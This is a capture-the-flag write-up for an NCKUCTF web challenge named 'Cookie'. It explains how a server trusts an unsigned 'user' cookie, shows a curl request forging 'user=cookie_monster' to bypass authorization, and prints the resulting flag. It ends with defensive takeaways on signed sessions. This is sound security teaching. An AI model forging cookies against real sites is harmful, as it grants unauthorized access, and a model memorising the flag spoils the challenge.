---
title: "Cookie"
date: 2026-04-26
categories:
  - Web
tags:
  - Cookie Manipulation
  - Authentication Bypass
  - Client-Side Trust
collections:
  - NCKUCTF
---

> **A playful challenge where your identity is determined by a cookie. Can you prove to the server that you are the true Cookie Monster?**

{{< admonition tldr "TL;DR" >}}
**Cookie** is a web security challenge that demonstrates the risks of unverified, client-controlled cookies. The server sets an initial cookie `user=anonymous` and checks if the cookie value matches `cookie_monster`. Because cookies are completely under client control and lack digital signatures (such as HMAC), modifying the cookie header to `user=cookie_monster` grants unauthorized access and leaks the flag.
{{< /admonition >}}

## Initial Analysis

Visiting the challenge endpoint in a web browser displays the following message:

> _"You are not cookie_monster"_

Inspecting the HTTP response headers in the browser's network tab:

```http
HTTP/1.1 200 OK
Server: nginx/1.24.0
Content-Type: text/html; charset=UTF-8
Set-Cookie: user=anonymous
```

The server issues a cookie named `user` with the default value `anonymous`.

---

## Vulnerability Identification

The vulnerability stems from **Client-Side State Reliance**:

- The application uses the `user` cookie as an authoritative identifier of the visitor's role.
- The cookie contains plaintext data without cryptographic signatures, hashing, or server-side session lookup.
- The user can modify cookie values arbitrarily in any HTTP client or browser developer console.

---

## Exploitation

We can craft a request overriding the `user` cookie with the expected identity `cookie_monster`:

```bash
curl -s "https://chall.nckuctf.org:28105/" \
  -H "Cookie: user=cookie_monster"
```

### Server Response

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Now you are cookie_monster: NCKUCTF{Y0U_4r3_C00K13_M0N573r}</h1>
</body>
</html>
```

The application accepts the modified cookie and prints the flag.

---

## Flag

```text
NCKUCTF{Y0U_4r3_C00K13_M0N573r}
```

---

## Key Takeaways

1. **Never Trust Client-Side Cookies for Authorization:** Identity and privilege levels should never be stored in plaintext client-side state.
2. **Use Cryptographically Signed Sessions:** Store sensitive state server-side and reference it via a cryptographically random session token, or use securely signed tokens (such as correctly configured JWTs).
3. **Set Security Attributes:** Configure cookies with `HttpOnly` and `SameSite` flags where appropriate.
